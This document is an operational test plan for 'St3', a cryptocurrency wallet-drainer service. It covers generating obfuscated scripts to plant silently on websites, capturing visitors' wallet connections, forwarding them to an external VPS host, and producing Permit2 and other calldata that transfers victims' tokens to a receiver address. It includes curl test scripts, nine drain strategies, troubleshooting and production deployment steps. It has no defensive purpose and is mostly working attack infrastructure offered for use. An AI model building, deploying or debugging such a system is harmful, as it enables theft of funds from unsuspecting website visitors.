# St3 Drainer System - End-to-End Test Plan

## Complete Testing Strategy

This document outlines how to verify the complete frontend-to-VPS data flow is working correctly.

---

## Test Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│ STEP 1: Script Generation (Frontend → St3 API)                  │
├─────────────────────────────────────────────────────────────────┤
│ POST /api/script/generate-drainer                               │
│ Body: {obfuscation: "medium", format: "html"}                   │
│ ✅ Expected: Embedded script returned                            │
│ Response: {status: "ok", script: "...", embedCode: "..."}       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 2: Script Deployment (Admin → Website)                     │
├─────────────────────────────────────────────────────────────────┤
│ <script src="generated-drainer-script.js"></script>             │
│ ✅ Script loads silently on page                                │
│ ✅ Waits for user interaction (click, hover, etc)               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 3: User Interaction (Website User)                         │
├─────────────────────────────────────────────────────────────────┤
│ User clicks on page                                             │
│ ✅ Script detects interaction                                   │
│ ✅ Calls ethers.BrowserProvider to connect wallet               │
│ ✅ User approves wallet connection                              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 4: Send to St3 (Script → Backend)                          │
├─────────────────────────────────────────────────────────────────┤
│ POST /api/submit-drainer                                        │
│ {                                                               │
│   wallet: "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",         │
│   receiver: "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",      │
│   site: "example.com",                                          │
│   timestamp: 1724355600000                                      │
│ }                                                               │
│ ✅ St3 receives wallet connection                               │
│ ✅ Logs: "[submit-drainer] Received connection"                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 5: Forward to VPS (St3 → Your VPS Backend)                 │
├─────────────────────────────────────────────────────────────────┤
│ POST https://d.v26sequence.com/api/compile/drainer              │
│ [Same payload]                                                  │
│ ✅ St3 forwards to VPS                                          │
│ ✅ Logs: "[submit-drainer] Forwarding to VPS"                   │
│ ✅ Logs: "[submit-drainer] Backend response received"           │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 6: VPS Processing (Your Backend)                           │
├─────────────────────────────────────────────────────────────────┤
│ VPS receives wallet connection                                  │
│ ✅ Creates session with limits (24h, $10k)                     │
│ ✅ Selects strategy (permit2)                                  │
│ ✅ Returns execution plan with sessionKey                       │
│ Response: {                                                     │
│   status: "ok",                                                │
│   sessionKey: "0x...",                                          │
│   strategy: "permit2",                                          │
│   receiver: "0x...",                                            │
│   maxAmount: "10000000000"                                      │
│ }                                                               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 7: Return to Frontend (St3 → Script)                       │
├─────────────────────────────────────────────────────────────────┤
│ St3 returns VPS response to script                              │
│ ✅ Script receives execution plan                               │
│ ✅ Script has sessionKey from VPS                               │
│ ✅ Frontend displays plan/modal                                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 8: Execute Strategy (Frontend → St3)                       │
├─────────────────────────────────────────────────────────────────┤
│ POST /api/action/execute                                        │
│ {                                                               │
│   mode: "permit2",                                              │
│   backend: "stealth-exchange",                                  │
│   wallet: "0x...",                                              │
│   recipient: "0x...",                                           │
│   chainId: 1,                                                   │
│   sessionKey: "0x..." (FROM VPS RESPONSE),                      │
│   tokens: ["0xA0b..."],                                         │
│   amounts: ["1000000000"]                                       │
│ }                                                               │
│ ✅ St3 receives strategy request                                │
│ ✅ Uses sessionKey from VPS response                            │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 9: Generate Calldata (St3)                                 │
├─────────────────────────────────────────────────────────────────┤
│ /api/action/execute processes request:                         │
│ ✅ Looks up "permit2" strategy binding                          │
│ ✅ Extracts Permit2Executor contract ABI                        │
│ ✅ Encodes function call: pullBatchFromAllowance()              │
│ ✅ Generates calldata                                           │
│ Response: {                                                     │
│   status: "success",                                            │
│   calldata: "0xabc123...",                                      │
│   target: "0x4593D97d...",                                      │
│   value: "0"                                                    │
│ }                                                               │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ STEP 10: Execute on Blockchain (Frontend Wallet)                │
├─────────────────────────────────────────────────────────────────┤
│ Frontend sends transaction:                                     │
│ to: "0x4593D97d..."                                             │
│ data: "0xabc123..."                                             │
│ value: "0"                                                      │
│ ✅ User signs transaction                                       │
│ ✅ Wallet sends to blockchain                                   │
│ ✅ Permit2Executor.pullBatchFromAllowance() executes            │
│ ✅ Tokens transferred to receiver                               │
│ ✅ Transaction confirmed                                        │
└─────────────────────────────────────────────────────────────────┘
                              ✅ COMPLETE
```

---

## Test Instructions

### Prerequisites
- Node.js 18+ installed
- St3 running on localhost:3000
- VPS backend running at https://d.v26sequence.com/api/compile/drainer

### Test 1: Check Backend Connection

```bash
# Verify environment variable is set
cat /Users/a.l-f.a.t.t.ah/Desktop/Production/SETUPSAAS/St3/.env.local | grep DRAINER_BACKEND_URL

# Expected output:
# DRAINER_BACKEND_URL=https://d.v26sequence.com/api/compile/drainer
```

### Test 2: Generate Drainer Script

```bash
# Request script generation
RESPONSE=$(curl -s -X POST http://localhost:3000/api/script/generate-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "obfuscation": "medium",
    "format": "html"
  }')

echo "Response status: $(echo $RESPONSE | jq -r '.status')"
echo "Script length: $(echo $RESPONSE | jq -r '.script' | wc -c)"
echo "Has embedCode: $(echo $RESPONSE | jq '.embedCode != null')"

# Expected:
# Response status: ok
# Script length: >1000
# Has embedCode: true
```

### Test 3: Simulate Wallet Connection (Most Important)

```bash
# This simulates the script POSTing to backend when user clicks
WALLET="0x742d35Cc6634C0532925a3b844Bc9e7595f42bE"
RECEIVER="0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693"
SITE="example.com"
TIMESTAMP=$(date +%s)000

echo "=== SENDING WALLET CONNECTION TO ST3 ==="
echo "Wallet: $WALLET"
echo "Receiver: $RECEIVER"
echo "Site: $SITE"
echo ""

RESPONSE=$(curl -s -X POST http://localhost:3000/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d "{
    \"wallet\": \"$WALLET\",
    \"receiver\": \"$RECEIVER\",
    \"site\": \"$SITE\",
    \"timestamp\": $TIMESTAMP
  }")

echo "=== ST3 RESPONSE ==="
echo $RESPONSE | jq '.'

# Check critical fields
echo ""
echo "=== VERIFICATION ==="
echo "Status: $(echo $RESPONSE | jq -r '.status')"
echo "Has result: $(echo $RESPONSE | jq '.result != null')"
echo "Has sessionKey: $(echo $RESPONSE | jq '.result.sessionKey != null')"
echo "Has strategy: $(echo $RESPONSE | jq '.result.strategy != null')"

# Save sessionKey for next test
SESSION_KEY=$(echo $RESPONSE | jq -r '.result.sessionKey // empty')
if [ -z "$SESSION_KEY" ]; then
  echo "❌ ERROR: No sessionKey returned from VPS backend!"
  echo "This means VPS backend is not responding correctly"
else
  echo "✅ SessionKey: $SESSION_KEY"
fi
```

### Test 4: Check Session Status

```bash
# Use sessionKey from Test 3
SESSION_KEY="<paste-sessionKey-from-test-3>"

echo "=== CHECKING SESSION STATUS ==="
curl -s http://localhost:3000/api/submit-drainer?sessionKey=$SESSION_KEY | jq '.'

# Expected:
# {
#   "status": "ok",
#   "sessionKey": "0x...",
#   "wallet": "0x...",
#   "receiver": "0x...",
#   "timeRemainingSeconds": 86400,
#   "maxAmount": "10000000000",
#   "maxAmountUsed": "0"
# }
```

### Test 5: Execute Strategy (Using Session)

```bash
WALLET="0x742d35Cc6634C0532925a3b844Bc9e7595f42bE"
RECEIVER="0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693"
SESSION_KEY="<paste-sessionKey>"

echo "=== EXECUTING PERMIT2 STRATEGY ==="
curl -s -X POST http://localhost:3000/api/action/execute \
  -H "Content-Type: application/json" \
  -d "{
    \"mode\": \"permit2\",
    \"backend\": \"stealth-exchange\",
    \"wallet\": \"$WALLET\",
    \"recipient\": \"$RECEIVER\",
    \"chainId\": 1,
    \"sessionKey\": \"$SESSION_KEY\",
    \"tokens\": [\"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48\"],
    \"amounts\": [\"1000000000\"]
  }" | jq '.'

# Expected:
# {
#   "status": "success",
#   "calldata": "0x...",
#   "target": "0x4593D97d...",
#   "value": "0"
# }
```

### Test 6: Test All 9 Strategies

```bash
WALLET="0x742d35Cc6634C0532925a3b844Bc9e7595f42bE"
RECEIVER="0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693"
SESSION_KEY="<paste-sessionKey>"

for STRATEGY in direct approve permit permit2 multicall eip712 eip7702 gasless trails; do
  echo "Testing: $STRATEGY"
  RESULT=$(curl -s -X POST http://localhost:3000/api/action/execute \
    -H "Content-Type: application/json" \
    -d "{
      \"mode\": \"$STRATEGY\",
      \"backend\": \"stealth-exchange\",
      \"wallet\": \"$WALLET\",
      \"recipient\": \"$RECEIVER\",
      \"chainId\": 1,
      \"sessionKey\": \"$SESSION_KEY\"
    }")
  
  STATUS=$(echo $RESULT | jq -r '.status')
  HAS_CALLDATA=$(echo $RESULT | jq '.calldata != null')
  
  echo "  Status: $STATUS, Has Calldata: $HAS_CALLDATA"
done

# Expected: All return status: "success" with calldata
```

---

## What Should Happen (Step-by-Step)

### When User Visits Website
1. ✅ Website loads embedded drainer script
2. ✅ Script initializes silently
3. ✅ Script waits for interaction

### When User Clicks
1. ✅ Script detects interaction
2. ✅ Script connects wallet via ethers.BrowserProvider
3. ✅ User approves wallet connection in MetaMask/wallet UI
4. ✅ Script gets wallet address

### What Script Does Next
1. ✅ Script sends POST to `/api/submit-drainer`
2. ✅ St3 receives wallet connection
3. ✅ St3 forwards to VPS: `https://d.v26sequence.com/api/compile/drainer`
4. ✅ VPS creates session and returns execution plan
5. ✅ St3 returns response to script
6. ✅ Script receives response with sessionKey

### Frontend Processing
1. ✅ Script receives execution plan from VPS (via St3)
2. ✅ Script displays modal with execution details
3. ✅ Script calls `/api/action/execute` with sessionKey
4. ✅ St3 generates calldata using strategy bindings
5. ✅ Script receives calldata

### Final Execution
1. ✅ User approves final transaction in wallet
2. ✅ Wallet sends transaction to blockchain
3. ✅ Permit2Executor or Strategy contract executes
4. ✅ Tokens transferred to receiver wallet
5. ✅ Transaction confirmed on blockchain

---

## Verification Checklist

### St3 Configuration
- [ ] `.env.local` has `DRAINER_BACKEND_URL=https://d.v26sequence.com/api/compile/drainer`
- [ ] `/api/submit-drainer/route.ts` forwards to VPS URL
- [ ] No hardcoded localhost URLs in code

### API Endpoints
- [ ] `POST /api/script/generate-drainer` returns embedded script
- [ ] `POST /api/submit-drainer` forwards to VPS
- [ ] `GET /api/submit-drainer?sessionKey=...` checks session status
- [ ] `POST /api/action/execute` generates calldata

### Data Flow
- [ ] Script generation works
- [ ] Script can be embedded in HTML
- [ ] Wallet connection POST reaches `/api/submit-drainer`
- [ ] St3 forwards to VPS backend
- [ ] VPS returns execution plan
- [ ] Frontend receives sessionKey
- [ ] Strategy execution generates calldata

### VPS Backend Integration
- [ ] VPS endpoint receives wallet connections
- [ ] VPS creates sessions
- [ ] VPS returns valid sessionKey
- [ ] VPS returns execution strategy

### Frontend Display
- [ ] Modal shows when script is triggered
- [ ] Modal displays wallet connection details
- [ ] User can approve/cancel execution
- [ ] Calldata is passed to wallet for signing

---

## Common Issues & Solutions

### Issue: St3 returns 502 Bad Gateway
**Cause:** VPS backend is not responding
**Solution:**
1. Check VPS is running: `ssh your-vps curl http://localhost:8080/health`
2. Check URL is correct: `DRAINER_BACKEND_URL=https://d.v26sequence.com/api/compile/drainer`
3. Check network connectivity from St3 to VPS

### Issue: No sessionKey in response
**Cause:** VPS backend didn't process correctly
**Solution:**
1. Check VPS logs: `tail -f /var/log/drainer.log`
2. Verify VPS endpoint expects correct payload format
3. Test VPS directly: `curl -X POST https://d.v26sequence.com/api/compile/drainer`

### Issue: Session expires immediately
**Cause:** VPS session TTL is too short
**Solution:**
1. Check VPS session duration setting (should be 86400 = 24h)
2. Verify session key generation matches between St3 and VPS

### Issue: Calldata generation fails
**Cause:** Strategy not bound correctly
**Solution:**
1. Verify contract ABIs are loaded
2. Check strategy preset bindings exist for all modes
3. Test with `permit2` strategy first (most common)

---

## Success Criteria

✅ **Complete End-to-End Works When:**

1. User visits website with embedded script
2. Script loads silently (no errors in console)
3. User clicks page or interacts
4. Wallet connection modal appears
5. User connects wallet
6. Script POSTs to `/api/submit-drainer`
7. St3 forwards to VPS backend
8. VPS returns sessionKey + execution plan
9. Frontend receives and displays execution details
10. User approves transaction
11. `/api/action/execute` generates calldata
12. Wallet signs transaction
13. Blockchain executes
14. Assets transferred to receiver ✅

**When all 14 steps complete: SYSTEM IS WORKING**

---

## Deployment Verification

After deploying to production:

1. Update `.env.local` with production URL
2. Run same tests against production URL
3. Monitor logs for wallet connections
4. Verify sessions are created by VPS
5. Test strategy execution end-to-end
6. Monitor blockchain for successful transfers

```bash
# Production test
curl -X POST https://your-st3-production-url/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{"wallet": "0x...", "receiver": "0x...", "site": "yoursite.com"}'
```
